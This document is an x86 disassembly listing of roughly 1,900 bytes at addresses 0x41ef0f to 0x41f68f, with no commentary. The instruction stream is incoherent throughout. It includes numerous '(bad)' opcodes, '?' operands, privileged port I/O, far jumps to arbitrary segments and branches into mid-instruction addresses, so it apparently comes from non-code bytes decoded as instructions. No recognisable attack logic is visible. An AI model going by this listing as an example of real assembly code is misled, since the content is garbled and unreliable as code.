  41ef0f:	fimul  WORD PTR [eax+0x7602ba6b]
  41ef15:	add    DWORD PTR [esi-0x2cd5fa9c],edi
  41ef1b:	cmp    ch,0x98
  41ef1e:	adc    edi,ebp
  41ef20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef21:	jmp    0x5efc:0xb0285857
  41ef28:	out    dx,al
  41ef29:	jnp    0x41ef1d
  41ef2b:	xor    al,0x69
  41ef2d:	ror    DWORD PTR [ebp-0x1],0xf6
  41ef31:	cwde   
  41ef32:	jl     0x41eec7
  41ef34:	std    
  41ef35:	or     DWORD PTR [ebp-0x33fd166c],ebx
  41ef3b:	add    esp,edx
  41ef3d:	mov    ?,WORD PTR [ebp+0x433d50cd]
  41ef43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef44:	or     bl,BYTE PTR fs:[edx+0x2c]
  41ef48:	in     eax,0xe8
  41ef4a:	das    
  41ef4b:	imul   esp,DWORD PTR cs:[edx+eax*1+0x5158b155],0x1efcdd1e
  41ef57:	cld    
  41ef58:	pmuludq mm3,mm2
  41ef5b:	addr16 (bad) 
  41ef5d:	(bad)  
  41ef5e:	xchg   esp,eax
  41ef5f:	sbb    DWORD PTR [edx-0x9],esi
  41ef62:	sbb    eax,0x910528b2
  41ef67:	mov    ch,0x14
  41ef69:	in     eax,0x3c
  41ef6b:	adc    dh,BYTE PTR [esi+0x3a]
  41ef6e:	outs   dx,DWORD PTR ds:[esi]
  41ef6f:	mul    ebx
  41ef71:	or     al,0xdf
  41ef73:	and    DWORD PTR [eax+ecx*1],ebp
  41ef76:	mov    ebp,0x158fa75a
  41ef7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef7c:	sub    BYTE PTR [esi+0x7b],bl
  41ef7f:	mov    ebx,0x5e283e51
  41ef84:	scas   al,BYTE PTR es:[edi]
  41ef85:	test   DWORD PTR [edi-0x7ea9f779],ebx
  41ef8b:	push   ss
  41ef8c:	inc    edi
  41ef8d:	add    BYTE PTR [ebp-0x3d],dh
  41ef90:	jae    0x41efd3
  41ef92:	pop    ebx
  41ef93:	xchg   BYTE PTR [esi],al
  41ef95:	xor    edx,eax
  41ef97:	jne    0x41ef85
  41ef99:	mov    ebx,0xee91093b
  41ef9e:	mov    ds:0x978080dd,al
  41efa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efa4:	mov    dl,BYTE PTR [edi-0xd]
  41efa7:	imul   ebx,DWORD PTR [ebx+0x27566705],0x54
  41efae:	and    esi,DWORD PTR [esi-0x1c673234]
  41efb4:	and    DWORD PTR [esi+0x7b2d6be3],eax
  41efba:	shl    DWORD PTR [edx+edi*4+0x45],0x9
  41efbf:	popf   
  41efc0:	lds    eax,FWORD PTR [ecx-0x5e3aecd3]
  41efc6:	inc    edi
  41efc7:	in     al,dx
  41efc8:	push   0xba9395fb
  41efcd:	sar    DWORD PTR [esi],0xe6
  41efd0:	pop    edx
  41efd1:	push   esp
  41efd2:	pop    ecx
  41efd3:	(bad)  
  41efd5:	dec    edi
  41efd6:	pop    esi
  41efd7:	sahf   
  41efd8:	test   edx,edx
  41efda:	mov    ds:0x97c28c16,eax
  41efdf:	adc    BYTE PTR [edi+0x7e30686b],ah
  41efe5:	rcr    BYTE PTR [ebx+eiz*8-0x3af53968],cl
  41efec:	loope  0x41f00c
  41efee:	cmp    DWORD PTR [edi],edi
  41eff0:	xchg   edx,eax
  41eff1:	cli    
  41eff2:	and    BYTE PTR [eax-0x7e],bl
  41eff5:	pop    esi
  41eff6:	enter  0x8a33,0x23
  41effa:	outs   dx,DWORD PTR ds:[esi]
  41effb:	ds aad 0xb5
  41effe:	icebp  
  41efff:	pusha  
  41f000:	aad    0x7
  41f002:	jno    0x41ef8b
  41f004:	dec    esp
  41f005:	mov    ch,0x8e
  41f007:	fld    TBYTE PTR [ebp+0x7754d058]
  41f00d:	scas   al,BYTE PTR es:[edi]
  41f00e:	dec    ebx
  41f00f:	cmp    al,0x32
  41f011:	cld    
  41f012:	aaa    
  41f013:	or     eax,0x20ed9e05
  41f018:	mov    BYTE PTR [eax+0x71e4fa33],cl
  41f01e:	or     BYTE PTR [edx+0x2e],cl
  41f021:	sti    
  41f022:	cmp    al,0x27
  41f024:	mov    al,ds:0xb9629161
  41f029:	mov    edi,0xd29feff7
  41f02e:	mov    al,0x58
  41f030:	jo     0x41f05c
  41f032:	mov    edi,0xdb598208
  41f037:	sbb    eax,0x2b5623b7
  41f03c:	jne    0x41efd9
  41f03e:	outs   dx,BYTE PTR ds:[esi]
  41f03f:	cld    
  41f040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f041:	mov    ecx,0xdb11173d
  41f046:	dec    ebp
  41f047:	call   0xd66e:0x9fd15c02
  41f04e:	pushf  
  41f04f:	xchg   ebx,eax
  41f050:	out    0x5e,al
  41f052:	cli    
  41f053:	cmp    DWORD PTR [esi-0x1fb9540c],0x39
  41f05a:	fwait
  41f05b:	cwde   
  41f05c:	pusha  
  41f05d:	cmc    
  41f05e:	dec    ebp
  41f05f:	push   ebp
  41f060:	mov    eax,0x3a5996d2
  41f065:	mov    edi,edi
  41f067:	inc    edi
  41f068:	test   al,0xa3
  41f06a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f06b:	retf   
  41f06c:	push   0x3fe0be49
  41f071:	ss aaa 
  41f073:	jle    0x41f0bd
  41f075:	ror    bl,1
  41f077:	push   ebx
  41f078:	mul    DWORD PTR ds:0x4088a37c
  41f07e:	sbb    DWORD PTR [ecx+0x27130612],esp
  41f084:	ss mov dh,0xa3
  41f087:	test   eax,0xa3a1a3aa
  41f08c:	lods   eax,DWORD PTR ds:[esi]
  41f08d:	outs   dx,BYTE PTR ds:[esi]
  41f08e:	ja     0x41f026
  41f090:	pmulhw mm2,QWORD PTR [eax-0x22fdf102]
  41f097:	dec    edx
  41f098:	addr16 sahf 
  41f09a:	ret    
  41f09b:	lods   al,BYTE PTR ds:[esi]
  41f09c:	adc    ebp,0xc7a58bf7
  41f0a2:	mov    bl,0xdd
  41f0a4:	and    DWORD PTR [edx-0x1a3388c8],ebx
  41f0aa:	cli    
  41f0ab:	fcmovbe st,st(5)
  41f0ad:	loope  0x41f0e7
  41f0af:	in     al,dx
  41f0b0:	push   eax
  41f0b1:	mov    dl,0x17
  41f0b3:	mov    cl,bl
  41f0b5:	nop
  41f0b6:	int3   
  41f0b7:	cmp    eax,0x87590e20
  41f0bc:	shl    ecx,1
  41f0be:	sbb    ch,cl
  41f0c0:	js     0x41f049
  41f0c2:	jge    0x41f0e4
  41f0c4:	call   0x96c7:0xd14fd4c3
  41f0cb:	test   eax,0x7d313580
  41f0d0:	and    BYTE PTR [eax-0x7b],cl
  41f0d3:	pusha  
  41f0d4:	push   ebp
  41f0d5:	xor    ah,ch
  41f0d7:	sub    eax,0x82d113cf
  41f0dc:	aam    0x97
  41f0de:	pushf  
  41f0df:	ins    DWORD PTR es:[edi],dx
  41f0e0:	sub    BYTE PTR [esi-0x7ea3fac6],ah
  41f0e6:	sbb    eax,0x23857ea
  41f0eb:	das    
  41f0ec:	and    ebx,DWORD PTR [ebp+0x4e9a89ef]
  41f0f2:	fisttp WORD PTR [edi]
  41f0f5:	loopne 0x41f15f
  41f0f7:	es test eax,0x4c08a510
  41f0fd:	pop    ebp
  41f0fe:	fisttp QWORD PTR [ecx-0x2d414947]
  41f104:	sbb    ch,BYTE PTR [ebx-0x19]
  41f107:	je     0x41f15c
  41f109:	jecxz  0x41f170
  41f10b:	push   ds
  41f10c:	jp     0x41f16c
  41f10e:	ret    
  41f10f:	xor    BYTE PTR [edi-0x18],al
  41f112:	(bad)  
  41f113:	out    dx,eax
  41f114:	pop    eax
  41f115:	adc    BYTE PTR [eax-0x6a],dh
  41f118:	push   cs
  41f119:	ds test al,0x97
  41f11c:	sti    
  41f11d:	or     ebp,DWORD PTR [edi+edi*2-0x4f]
  41f121:	cmp    DWORD PTR [eax-0x15],eax
  41f124:	pcmpgtw mm0,QWORD PTR [ebp+0x4c50863]
  41f12b:	not    ah
  41f12d:	xor    eax,0x1b4f67bb
  41f132:	call   0xba53:0x3f4dd02b
  41f139:	inc    ebp
  41f13a:	lea    esp,[ebp+0x68758575]
  41f140:	idiv   DWORD PTR [edi+0x456f8b9a]
  41f146:	add    al,0xc3
  41f148:	loop   0x41f1b2
  41f14a:	outs   dx,BYTE PTR ds:[esi]
  41f14b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f14c:	lods   eax,DWORD PTR ds:[esi]
  41f14d:	ds out 0x33,eax
  41f150:	or     eax,0x12bd890
  41f155:	pop    edx
  41f156:	push   0x43b6b398
  41f15b:	jecxz  0x41f0ed
  41f15d:	push   esp
  41f15e:	jge    0x41f0f8
  41f160:	arpl   WORD PTR [ebp-0x7a],si
  41f163:	les    eax,FWORD PTR [ecx-0x4874e037]
  41f169:	sar    BYTE PTR ds:0x9b0280d3,cl
  41f16f:	mov    ch,0xf2
  41f171:	mov    WORD PTR [ecx-0xe],fs
  41f174:	mov    dh,0x61
  41f176:	push   ecx
  41f177:	xchg   esp,eax
  41f178:	xor    dh,dl
  41f17a:	jmp    0x781a:0x270e70dc
  41f181:	fidivr DWORD PTR [edi]
  41f183:	xor    al,0xdf
  41f185:	shl    DWORD PTR [edx],1
  41f187:	xor    BYTE PTR [edi-0x28a96034],cl
  41f18d:	mov    es,WORD PTR [ecx+0x3f3a005e]
  41f193:	adc    eax,0xb986fffd
  41f198:	iret   
  41f199:	scas   eax,DWORD PTR es:[edi]
  41f19a:	dec    ebp
  41f19b:	fld    DWORD PTR [ecx+edi*4+0x67]
  41f19f:	pushf  
  41f1a0:	loopne 0x41f124
  41f1a2:	sbb    ebp,DWORD PTR fs:[ecx-0x59]
  41f1a6:	shl    DWORD PTR [esi+0x50a938bc],cl
  41f1ac:	aas    
  41f1ad:	add    ebx,DWORD PTR [eax+0x63b42644]
  41f1b3:	push   cs
  41f1b4:	outs   dx,DWORD PTR ds:[esi]
  41f1b5:	in     al,dx
  41f1b6:	loope  0x41f1f0
  41f1b8:	add    dh,bl
  41f1ba:	fmul   DWORD PTR [ebp+0x69dd0df1]
  41f1c0:	ret    
  41f1c1:	std    
  41f1c2:	adc    al,0xc1
  41f1c4:	mov    dh,0x23
  41f1c6:	dec    edi
  41f1c7:	sub    DWORD PTR [esi+eax*8],ecx
  41f1ca:	iret   
  41f1cb:	dec    esp
  41f1cc:	inc    ebx
  41f1cd:	scas   eax,DWORD PTR es:[edi]
  41f1ce:	cmp    eax,0xd7258511
  41f1d3:	jge    0x41f234
  41f1d5:	push   ecx
  41f1d6:	inc    ebp
  41f1d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1d8:	cmp    ebp,DWORD PTR [edi+0x12]
  41f1db:	sbb    al,0xcd
  41f1dd:	loopne 0x41f23b
  41f1df:	cld    
  41f1e0:	ret    
  41f1e1:	lods   eax,DWORD PTR ds:[esi]
  41f1e2:	(bad)  
  41f1e3:	lods   eax,DWORD PTR ds:[esi]
  41f1e4:	sub    BYTE PTR [esi-0x5d45de1c],dl
  41f1ea:	call   0xfe06:0xad55afdd
  41f1f1:	out    dx,eax
  41f1f2:	call   0x2adb:0xd88a44c5
  41f1f9:	lods   al,BYTE PTR ds:[esi]
  41f1fa:	sub    DWORD PTR [ecx-0x7],esp
  41f1fd:	push   ebx
  41f1fe:	stos   DWORD PTR es:[edi],eax
  41f1ff:	mov    WORD PTR [ecx],cs
  41f201:	pusha  
  41f202:	test   BYTE PTR [eax+0x6c],bl
  41f205:	mov    dl,0x19
  41f207:	arpl   WORD PTR [edi+0x2d],ax
  41f20a:	mov    eax,ds:0x44e545b2
  41f20f:	stos   BYTE PTR es:[edi],al
  41f210:	mov    eax,ds:0x3c2eaffd
  41f215:	in     al,0xfb
  41f217:	ja     0x41f254
  41f219:	lods   eax,DWORD PTR ds:[esi]
  41f21a:	repnz aad 0x93
  41f21d:	xchg   ebp,eax
  41f21e:	lods   al,BYTE PTR ds:[esi]
  41f220:	aaa    
  41f221:	adc    al,0x11
  41f223:	push   ebx
  41f224:	out    dx,eax
  41f225:	jmp    0xd5a6f241
  41f22a:	sahf   
  41f22b:	add    eax,0x2e884f9f
  41f230:	mov    ebp,0x7625228b
  41f235:	sbb    DWORD PTR [ebx],0x4d
  41f238:	mov    esp,0x6047c2ee
  41f23d:	(bad)  
  41f23e:	(bad)  
  41f23f:	push   ebx
  41f240:	dec    edi
  41f241:	stos   DWORD PTR es:[edi],eax
  41f242:	fld    QWORD PTR [edx-0x22f6fbf]
  41f248:	dec    ebx
  41f249:	add    ebx,DWORD PTR [esi+ebp*2]
  41f24c:	or     eax,0x87232461
  41f251:	pop    ds
  41f252:	or     ecx,DWORD PTR [ebx-0x62]
  41f255:	nop
  41f256:	dec    ebx
  41f257:	lea    edi,[eax-0x13]
  41f25a:	push   0x52
  41f25c:	out    0x68,eax
  41f25e:	sahf   
  41f25f:	mov    dh,0x68
  41f261:	push   edi
  41f262:	pop    eax
  41f263:	inc    esp
  41f264:	inc    edi
  41f265:	test   eax,0xccd611d7
  41f26a:	std    
  41f26b:	xor    dh,BYTE PTR [esi+eax*1-0x73e9e1b]
  41f272:	xchg   esp,eax
  41f273:	adc    esi,DWORD PTR [edx]
  41f275:	aas    
  41f276:	jmp    FWORD PTR [esi+0x51]
  41f279:	add    eax,0xadb67ab
  41f27e:	push   eax
  41f27f:	mov    BYTE PTR [edx-0x6af0f9c9],dl
  41f285:	inc    ebp
  41f286:	out    dx,eax
  41f287:	mov    dl,0x73
  41f289:	mov    WORD PTR [ebp+0x7e1cd29f],ss
  41f28f:	xor    bh,BYTE PTR [ebx]
  41f291:	mov    bl,0x56
  41f293:	arpl   WORD PTR [ecx-0x2b],ax
  41f296:	mov    esp,0x62e43413
  41f29b:	pushf  
  41f29c:	inc    esp
  41f29d:	ret    0xe984
  41f2a0:	jno    0x41f2ba
  41f2a2:	push   es
  41f2a3:	push   esp
  41f2a4:	mov    cs:0xce976705,eax
  41f2aa:	sbb    bh,BYTE PTR [edx]
  41f2ac:	dec    eax
  41f2ad:	xchg   esp,eax
  41f2ae:	sub    eax,0xe841126c
  41f2b3:	jle    0x41f308
  41f2b5:	xchg   edi,eax
  41f2b6:	inc    eax
  41f2b7:	aad    0x7f
  41f2b9:	cmp    dl,BYTE PTR [edx+0x49]
  41f2bc:	xchg   ebp,eax
  41f2bd:	out    dx,eax
  41f2be:	inc    ecx
  41f2bf:	and    DWORD PTR [ebp-0x662d90a5],0x6cedd65d
  41f2c9:	jmp    0x41f294
  41f2cb:	scas   eax,DWORD PTR es:[edi]
  41f2cc:	idiv   ch
  41f2ce:	xor    BYTE PTR [ecx-0x3045bf32],0xc9
  41f2d5:	mov    ecx,0x49c43540
  41f2da:	dec    DWORD PTR ss:[ecx]
  41f2dd:	mov    edi,0x768d90f5
  41f2e2:	jne    0x41f29f
  41f2e4:	adc    dl,BYTE PTR [edx+0x6990b26a]
  41f2ea:	and    edi,edx
  41f2ec:	sbb    bl,BYTE PTR [esi-0x697310d8]
  41f2f2:	fs jno 0x41f2a3
  41f2f5:	lock pop ss
  41f2f7:	sbb    BYTE PTR [edi+0x55447cd5],dh
  41f2fd:	iret   
  41f2fe:	aas    
  41f2ff:	shl    BYTE PTR [ecx],cl
  41f301:	in     eax,0xba
  41f303:	ret    0xc503
  41f306:	dec    cx
  41f308:	add    bl,BYTE PTR [esp-0x4be88957]
  41f30f:	sahf   
  41f310:	jp     0x41f2d0
  41f312:	jmp    0x72917226
  41f317:	mov    ah,0xaf
  41f319:	loop   0x41f303
  41f31b:	dec    edi
  41f31c:	sub    BYTE PTR [ecx+0x65cfd18],0x3c
  41f323:	sub    eax,0xdc76985
  41f328:	test   DWORD PTR [ebx+0x4],ebp
  41f32b:	cmp    bl,al
  41f32d:	xchg   ebx,eax
  41f32e:	dec    edx
  41f32f:	fcom   st(2)
  41f331:	test   al,0x1d
  41f333:	ins    BYTE PTR es:[edi],dx
  41f334:	sbb    esi,esi
  41f336:	pusha  
  41f337:	iret   
  41f338:	jle    0x41f39e
  41f33a:	scas   al,BYTE PTR es:[edi]
  41f33b:	mov    ebp,0xffdae8c8
  41f340:	bound  edi,QWORD PTR [ebp-0x3]
  41f343:	and    eax,0x6cc3c3f9
  41f348:	sub    al,0xac
  41f34a:	popa   
  41f34b:	lods   al,BYTE PTR ds:[esi]
  41f34c:	cwde   
  41f34d:	dec    ebp
  41f34e:	in     eax,0x4d
  41f350:	push   ds
  41f351:	gs (bad) 
  41f353:	jg     0x41f2de
  41f355:	std    
  41f356:	loope  0x41f33f
  41f358:	(bad)  [edx-0x7c]
  41f35b:	push   ebp
  41f35c:	jl     0x965d19a
  41f362:	mov    cl,0xf5
  41f364:	ja     0x41f33f
  41f366:	push   edx
  41f367:	jecxz  0x41f330
  41f369:	push   ss
  41f36a:	mov    esi,0xcbb50f18
  41f36f:	jg     0x41f395
  41f371:	and    ecx,ebx
  41f373:	fldl2e 
  41f375:	(bad)  
  41f376:	dec    ebp
  41f377:	loop   0x41f392
  41f379:	dec    ebp
  41f37a:	mov    ebx,0xb0d05ac7
  41f37f:	scas   al,BYTE PTR es:[edi]
  41f380:	outs   dx,DWORD PTR ds:[esi]
  41f381:	popa   
  41f382:	std    
  41f383:	sub    ah,BYTE PTR es:[esi]
  41f386:	test   eax,0xa3f91774
  41f38b:	das    
  41f38c:	test   BYTE PTR [edi],dh
  41f38e:	or     al,0xdf
  41f390:	pushf  
  41f391:	sub    edi,esp
  41f393:	pop    ebx
  41f394:	xor    esp,DWORD PTR [esi-0x6a96b4b5]
  41f39a:	sahf   
  41f39b:	enter  0xefdb,0x80
  41f39f:	xchg   ebp,eax
  41f3a0:	mov    al,0x96
  41f3a2:	sbb    edi,DWORD PTR [ebp-0x5a83d58e]
  41f3a8:	fstp   QWORD PTR [esi+0x70]
  41f3ab:	jle    0x41f349
  41f3ad:	dec    ecx
  41f3ae:	inc    ecx
  41f3af:	(bad)  
  41f3b0:	stos   BYTE PTR es:[edi],al
  41f3b1:	shr    BYTE PTR [ebx-0x6e5a98e0],1
  41f3b7:	gs sti 
  41f3b9:	std    
  41f3ba:	mov    bl,cl
  41f3bc:	clc    
  41f3bd:	stos   BYTE PTR es:[edi],al
  41f3be:	jecxz  0x41f3e7
  41f3c0:	cdq    
  41f3c1:	lods   eax,DWORD PTR ds:[esi]
  41f3c2:	mov    WORD PTR [ecx],?
  41f3c4:	pop    esp
  41f3c5:	xchg   ebx,eax
  41f3c6:	mul    esi
  41f3c8:	rol    DWORD PTR [ebp-0x2c],1
  41f3cb:	or     DWORD PTR [ebp-0x68],0xffffffa6
  41f3cf:	call   0xa6257559
  41f3d4:	sub    eax,0x5bb50ca0
  41f3d9:	and    al,0x3
  41f3db:	out    dx,al
  41f3dc:	popa   
  41f3dd:	das    
  41f3de:	(bad)  
  41f3df:	and    cl,bl
  41f3e1:	jmp    0xa770:0x871e7310
  41f3e8:	repnz mov dh,BYTE PTR [ebx+0x1a362a9a]
  41f3ef:	ror    DWORD PTR [ecx],1
  41f3f1:	bound  ebp,QWORD PTR [edx+0x7]
  41f3f4:	mov    ds:0xb2bf1bb8,al
  41f3f9:	out    dx,eax
  41f3fa:	mov    edx,ebx
  41f3fc:	(bad)  
  41f3fd:	jns    0x41f39c
  41f3ff:	rcr    BYTE PTR [edi+0x2ece145e],cl
  41f405:	mov    ch,al
  41f407:	jmp    0xb3727cc0
  41f40c:	mov    ah,0xdf
  41f40e:	scas   eax,DWORD PTR es:[edi]
  41f40f:	loopne 0x41f484
  41f411:	js     0x41f3b3
  41f413:	jmp    0x56f64db7
  41f418:	fwait
  41f419:	mov    al,ds:0x866d221a
  41f41e:	aas    
  41f41f:	popa   
  41f420:	push   0x69
  41f422:	sbb    eax,ebp
  41f424:	daa    
  41f425:	lea    ebx,[esi-0x14d3c138]
  41f42b:	scas   al,BYTE PTR es:[edi]
  41f42c:	fnsave [edx+ebx*8+0x2409c142]
  41f433:	mov    BYTE PTR [eax-0x5565acbc],ah
  41f439:	sub    eax,0x7b952417
  41f43e:	nop
  41f43f:	es mov eax,0x9c9e5559
  41f445:	mov    ah,0x3d
  41f447:	push   ds
  41f448:	lods   al,BYTE PTR ds:[esi]
  41f449:	inc    ebp
  41f44a:	cmc    
  41f44b:	into   
  41f44c:	cmp    eax,0x8186bf41
  41f451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f452:	pop    ebx
  41f453:	mov    bh,0x65
  41f455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f456:	push   esp
  41f457:	jne    0x41f4bb
  41f459:	repz jnp 0x41f423
  41f45c:	fwait
  41f45d:	add    al,0x7d
  41f45f:	mov    eax,ds:0x5cb19ae3
  41f464:	not    BYTE PTR [ebp-0x24]
  41f467:	sbb    BYTE PTR [eax-0x3f145cc8],dh
  41f46d:	push   0x4
  41f46f:	daa    
  41f470:	retf   
  41f471:	ds push esi
  41f473:	xor    ecx,ebp
  41f475:	fistp  DWORD PTR [ecx]
  41f477:	xor    eax,0x5bcc29c7
  41f47c:	mov    cl,0x6
  41f47e:	dec    edx
  41f47f:	stos   DWORD PTR es:[edi],eax
  41f480:	clc    
  41f481:	mov    WORD PTR [ebx],?
  41f483:	and    eax,0xe0403b06
  41f488:	sub    BYTE PTR [edx+0x25062e8f],0xec
  41f48f:	popf   
  41f490:	xor    DWORD PTR [eax],esi
  41f492:	lahf   
  41f493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f494:	and    al,0x8c
  41f496:	xchg   ecx,eax
  41f497:	mov    ds:0x838a5607,al
  41f49c:	mov    al,ds:0x208e7270
  41f4a1:	mul    dl
  41f4a3:	jle    0x41f510
  41f4a5:	(bad)  
  41f4a6:	clc    
  41f4a7:	loope  0x41f460
  41f4a9:	dec    edx
  41f4aa:	aad    0x72
  41f4ac:	jb     0x41f4bb
  41f4ae:	mov    DWORD PTR [eax-0x2bbcef7b],ebp
  41f4b4:	stc    
  41f4b5:	inc    esp
  41f4b6:	gs jg  0x41f497
  41f4b9:	jle    0x41f455
  41f4bb:	jmp    0x41f4ad
  41f4bd:	mov    esp,0x765445b7
  41f4c2:	(bad)  
  41f4c3:	je     0x41f4e7
  41f4c5:	sbb    DWORD PTR [ecx],esp
  41f4c7:	aad    0xe
  41f4c9:	add    BYTE PTR [ebx-0x50],dh
  41f4cc:	mov    BYTE PTR [eax+ebp*8],0x53
  41f4d0:	stc    
  41f4d1:	daa    
  41f4d2:	aas    
  41f4d3:	or     al,0xa3
  41f4d5:	push   ecx
  41f4d6:	adc    al,0x5c
  41f4d8:	jmp    FWORD PTR [eax]
  41f4da:	xor    al,0xac
  41f4dc:	nop
  41f4dd:	push   cs
  41f4de:	jp     0x41f490
  41f4e0:	lods   eax,DWORD PTR ds:[esi]
  41f4e1:	jo     0x41f4b2
  41f4e3:	fs mov cl,0xb0
  41f4e6:	ins    DWORD PTR es:[edi],dx
  41f4e7:	mov    esi,0xad0b99c6
  41f4ec:	div    esi
  41f4ee:	jb     0x41f47b
  41f4f0:	outs   dx,BYTE PTR ds:[esi]
  41f4f1:	in     al,dx
  41f4f2:	add    al,0xae
  41f4f4:	pushf  
  41f4f5:	aad    0xbd
  41f4f7:	call   0xb2d3d652
  41f4fc:	(bad)
  41f4ff:	(bad)  
  41f500:	enter  0xf330,0x34
  41f504:	mov    dh,0x5e
  41f506:	inc    esp
  41f507:	lods   al,BYTE PTR ds:[esi]
  41f508:	push   esp
  41f509:	adc    eax,0x41e688bd
  41f50e:	cs jo  0x41f503
  41f511:	mov    es,WORD PTR [eax+0x61]
  41f514:	and    dh,BYTE PTR [edx-0x2]
  41f517:	je     0x41f505
  41f519:	loopne 0x41f4f6
  41f51b:	cmovl  edx,DWORD PTR [eax]
  41f51e:	rcr    BYTE PTR [ecx+eax*8+0x7a],1
  41f522:	hlt    
  41f523:	loopne 0x41f562
  41f525:	dec    eax
  41f526:	cmp    DWORD PTR [ecx+0x6b],esi
  41f529:	or     DWORD PTR [ebx],ebx
  41f52b:	inc    eax
  41f52c:	sub    BYTE PTR [esi+eiz*1],ch
  41f52f:	jmp    0x11473b2e
  41f534:	mov    bh,0x30
  41f536:	push   esi
  41f537:	lahf   
  41f538:	fs ins DWORD PTR es:[edi],dx
  41f53a:	xchg   edi,eax
  41f53b:	pusha  
  41f53c:	mov    ?,WORD PTR [ecx+0x3b]
  41f53f:	repnz nop
  41f541:	push   cs
  41f542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f543:	cmp    DWORD PTR [edi+0x69],eax
  41f546:	mov    esi,0x76f11da1
  41f54b:	sbb    edx,esi
  41f54d:	add    DWORD PTR [eax+eax*4-0x1756756d],esp
  41f554:	mov    ecx,0x366944f9
  41f55a:	mov    esp,ecx
  41f55c:	sbb    esp,esi
  41f55e:	pop    esi
  41f55f:	sbb    bl,ah
  41f561:	aad    0x9d
  41f563:	jbe    0x41f5b4
  41f565:	cmp    eax,eax
  41f567:	iret   
  41f568:	pslld  mm0,QWORD PTR [edi]
  41f56b:	pcmpeqw mm4,QWORD PTR [edx]
  41f56e:	call   0xacb2:0x1959a03c
  41f575:	das    
  41f576:	or     ch,BYTE PTR [eax+0x4adfaf3e]
  41f57c:	sbb    bh,BYTE PTR [edx-0x47]
  41f57f:	sar    DWORD PTR [edi-0x22bba776],cl
  41f585:	pop    es
  41f586:	imul   BYTE PTR [ebp-0x6c]
  41f589:	mov    al,0x29
  41f58b:	ret    0x412
  41f58e:	mov    ds:0x9419253a,al
  41f593:	xlat   BYTE PTR ds:[ebx]
  41f594:	sbb    ebx,DWORD PTR [ebx]
  41f596:	(bad)  
  41f597:	ficomp DWORD PTR [ebp+0x469955c9]
  41f59d:	or     eax,0x2cac4976
  41f5a2:	dec    eax
  41f5a3:	xchg   esp,eax
  41f5a4:	les    esp,FWORD PTR [eax-0x71f9a88d]
  41f5aa:	into   
  41f5ab:	enter  0x1f97,0xb6
  41f5af:	dec    edx
  41f5b0:	retf   
  41f5b1:	outs   dx,DWORD PTR ds:[esi]
  41f5b2:	lea    eax,[ebp+0x5e6dc0dd]
  41f5b8:	mov    al,0x99
  41f5ba:	(bad)  
  41f5bb:	jmp    0x6cb1a0d4
  41f5c0:	mov    ah,0xc0
  41f5c2:	jmp    0x41f5b6
  41f5c4:	xchg   edi,eax
  41f5c5:	mov    cl,0x4c
  41f5c7:	dec    esp
  41f5c8:	in     al,dx
  41f5c9:	dec    eax
  41f5ca:	jne    0x41f554
  41f5cc:	imul   ecx,DWORD PTR [edx+0x327a8f41],0x70e6f91a
  41f5d6:	jl     0x41f5a9
  41f5d8:	sub    DWORD PTR ds:0xd820bc4f,esi
  41f5de:	mov    ecx,0xa382d553
  41f5e3:	lahf   
  41f5e4:	mov    dl,0x65
  41f5e6:	mov    esi,0x46a0b375
  41f5eb:	sub    DWORD PTR [edx+0x45],0xffffff93
  41f5ef:	jl     0x41f5ca
  41f5f1:	pusha  
  41f5f2:	xchg   DWORD PTR [edi+0x54522fb2],ecx
  41f5f8:	mov    al,BYTE PTR [esi+0x6543eb93]
  41f5fe:	retf   0xe773
  41f601:	shr    DWORD PTR [ebx+0x2e],0x2c
  41f605:	dec    ebp
  41f606:	aam    0x74
  41f608:	or     al,0xac
  41f60a:	adc    DWORD PTR [edx],edi
  41f60c:	dec    esp
  41f60d:	sub    DWORD PTR [ecx+edi*1+0x52291f0c],eax
  41f614:	sbb    DWORD PTR [ecx],esp
  41f616:	in     al,0x6c
  41f618:	sub    DWORD PTR [edx-0x7859ac1],edx
  41f61e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f61f:	fs xchg ecx,eax
  41f621:	push   ds
  41f622:	(bad)  
  41f623:	fld    TBYTE PTR [esi-0xb]
  41f626:	leave  
  41f627:	push   edi
  41f628:	arpl   WORD PTR ds:0x7f5c77b9,dx
  41f62e:	mov    ebp,0x97bdfdba
  41f633:	out    dx,eax
  41f634:	push   es
  41f635:	scas   eax,DWORD PTR es:[edi]
  41f636:	jl     0x41f648
  41f638:	mov    ah,0x99
  41f63a:	mov    edi,0x91b73622
  41f63f:	xlat   BYTE PTR ds:[ebx]
  41f640:	xor    edi,DWORD PTR [ecx+0x61]
  41f643:	and    DWORD PTR [edx],edx
  41f645:	xchg   esp,eax
  41f646:	jmp    0xc3e7d425
  41f64b:	xor    eax,0x59d685db
  41f650:	pop    ebx
  41f651:	mov    ds:0xdf5f937b,eax
  41f656:	sub    ch,BYTE PTR [ecx]
  41f658:	add    BYTE PTR [edi+0x7b080106],0x49
  41f65f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f660:	and    ecx,DWORD PTR [eax]
  41f662:	and    eax,0x9b662203
  41f667:	fist   WORD PTR ds:0x1f7cfd06
  41f66d:	pop    ebp
  41f66e:	inc    ecx
  41f66f:	popa   
  41f670:	(bad)  
  41f671:	jno    0x41f68d
  41f673:	push   ds
  41f674:	test   esi,esi
  41f676:	dec    edi
  41f677:	sub    ebp,DWORD PTR [esi+edx*2+0x26]
  41f67b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f67c:	xchg   edi,eax
  41f67d:	xor    bl,BYTE PTR [edx-0x1f]
  41f680:	imul   eax,DWORD PTR [edi],0xffffff9e
  41f683:	sbb    esp,edi
  41f685:	out    0x44,al
  41f687:	sbb    eax,DWORD PTR [edx+edi*8]
  41f68a:	(bad)  
  41f68b:	(bad)  
  41f68c:	hlt    
  41f68d:	cmp    eax,esi
  41f68f:	pop    esp
